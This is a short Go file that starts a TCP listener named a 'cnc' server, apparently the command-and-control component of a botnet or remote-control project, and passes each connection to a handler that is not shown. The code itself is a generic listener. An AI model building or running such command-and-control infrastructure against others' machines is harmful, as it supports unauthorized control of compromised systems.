package server

import (
	"fmt"
	"log"
	"net"
	"webserver/src/config"
)

func Start() {
	l, err := net.Listen("tcp4", fmt.Sprintf("%s:%d", config.Cfg.CncServer.Host, config.Cfg.CncServer.Port))
	if err != nil {
		log.Fatal(err)
		return
	}

	log.Printf("\u001B[0m\u001B[107m\u001B[38;5;163m[cnc/server]\u001B[0m\u001B[38;5;046m cnc Started! \u001B[38;5;230m")

	for {
		conn, err := l.Accept()
		if err != nil {
			log.Printf("(cnc/err) %s", err)
			return
		}

		go handler(conn)
	}
}
